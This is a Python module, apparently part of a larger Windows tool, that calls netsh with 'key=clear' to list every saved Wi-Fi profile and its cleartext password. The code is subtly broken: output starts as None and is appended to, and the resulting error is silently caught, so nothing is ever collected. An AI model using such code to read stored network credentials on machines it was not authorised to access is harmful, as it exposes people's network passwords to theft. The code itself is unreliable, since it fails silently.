import os
import subprocess
import src.utils.errors as errors


class Wifi:
    def __init__(self, file=None, error_file=None):
        self.output = None
        self.file = file
        self.error_file = error_file

    def getOutput(self):
        try:
            return subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode(
                'utf-8', errors="backslashreplace").split('\n')
        except Exception as e:
            if self.error_file:
                self.error_file.write("\n{err}".format(err=e))
            raise errors.WifiPasswordError

    def processOutput(self):
        data = self.getOutput()
        profiles = [i.split(":")[1][1:-1]
                    for i in data if "All User Profile" in i]
        for i in profiles:
            try:
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
                    'utf-8', errors="backslashreplace").split('\n')
                results = [b.split(":")[1][1:-1]
                           for b in results if "Key Content" in b]
                try:
                    self.output += "\n{:<30}|  {:<}".format(i, results[0])
                except IndexError:
                    self.output += "\n{:<30}|  {:<}".format(i, "")
            except subprocess.CalledProcessError:
                self.output += "\n{:<30}|  {:<}".format(i, "ENCODING ERROR")
            except Exception as e:
                if self.error_file:
                    self.error_file.write("\n{err}".format(err=e))
